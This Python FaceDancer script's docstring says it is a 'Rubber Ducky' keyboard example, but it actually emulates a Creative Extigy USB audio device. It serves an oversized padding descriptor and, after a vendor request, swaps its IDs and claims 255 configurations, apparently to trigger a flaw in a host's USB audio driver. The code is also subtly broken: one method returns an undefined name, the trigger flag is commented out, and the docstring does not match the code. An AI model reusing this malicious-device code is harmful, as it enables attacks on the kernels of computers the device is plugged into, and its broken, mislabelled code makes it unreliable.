#!/usr/bin/env python3
#
# This file is part of FaceDancer.
#
""" USB 'Rubber Ducky' example; enters some text via the keyboard module. """

import asyncio
import logging

from facedancer import main
from facedancer.future import USBDevice, USBConfiguration, USBInterface, USBEndpoint, USBDirection, USBTransferType, use_inner_classes_automatically, USBClassDescriptor, vendor_request_handler
from facedancer.classes import USBDeviceClass

USB_SUBCLASS_AUDIOCONTROL = 0x01

OUT_ENDPOINT = 1
IN_ENDPOINT  = 3
PADDING_LENGTH = 483 - 18
PADDING_BYTES = bytes([0xff] + ([0]*0xfe) + [PADDING_LENGTH - 1 - 0xfe] + ([0]*(PADDING_LENGTH - 1 - 0xfe - 1)))

@use_inner_classes_automatically
class USBExtigyDevice(USBDevice):
    vendor_id: int = 0x041e
    product_id: int = 0x3000

    received_vendor_boot_message : bool = False
    class _Configuration(USBConfiguration):
        class _Interface(USBInterface):
            class_number    : int = USBDeviceClass.AUDIO
            subclass_number    : int = USB_SUBCLASS_AUDIOCONTROL
            class _PaddingDescriptor(USBClassDescriptor):
                number : int = 0
                raw : bytes = PADDING_BYTES
                def get_descriptor(self) -> bytes:
                    return raw
    class _Configuration2(USBConfiguration):
        number: int = 2

    @vendor_request_handler(number=0x10)
    def handle_vendor_boot_message(self, request):
        logging.info("Received Extigy vendor boot message")
        #self.received_vendor_boot_message = True
        request.acknowledge()

    def get_descriptor(self) -> bytes:
        a = super().get_descriptor()
        if self.received_vendor_boot_message:
            b = bytearray(a)
            b[0x8:0x8+2] = b"\x63\x07" # idVendor
            b[0xa:0xa+2] = b"\x12\x20" # idProduct
            b[0x11] = 0xff # bNumConfigurations
            a = bytes(b)
        return a

device = USBExtigyDevice()

async def run_extigy():
    logging.info("Beginning message typing demo...")

main(device, run_extigy())
